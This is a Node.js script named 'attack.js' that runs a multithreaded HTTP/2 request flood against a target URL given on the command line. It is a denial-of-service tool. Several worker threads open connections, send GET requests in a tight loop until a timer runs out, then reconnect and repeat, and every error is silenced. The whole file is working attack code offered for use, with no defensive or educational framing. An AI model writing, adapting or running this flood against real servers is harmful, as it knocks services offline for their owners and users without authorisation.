const http2 = require('http2');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const { cpus } = require('os');

const THREADS = Math.max(5, Math.min(8, cpus().length));

if (isMainThread) {
    if (process.argv.length < 4) {
        console.error('Usage: node attack.js <target> <duration_secs>');
        process.exit(1);
    }

    const target = process.argv[2];
    const duration = parseInt(process.argv[3]);

    console.log(`Launching attack on ${target} for ${duration}s with ${THREADS} threads...`);

    for (let i = 0; i < THREADS; i++) {
        new Worker(__filename, { workerData: { target, duration } });
    }
} else {
    const { target, duration } = workerData;
    const end = Date.now() + duration * 1000;

    function flood() {
        if (Date.now() > end) return;

        try {
            const client = http2.connect(target);
            client.on('error', () => {});

            const run = () => {
                while (Date.now() < end) {
                    const req = client.request({ ':path': '/', ':method': 'GET' });
                    req.on('error', () => {});
                    req.end();
                }
                client.close();
                setImmediate(flood); // reconnect and flood again
            };

            client.on('connect', run);
        } catch (e) {
            setImmediate(flood);
        }
    }

    flood();
}
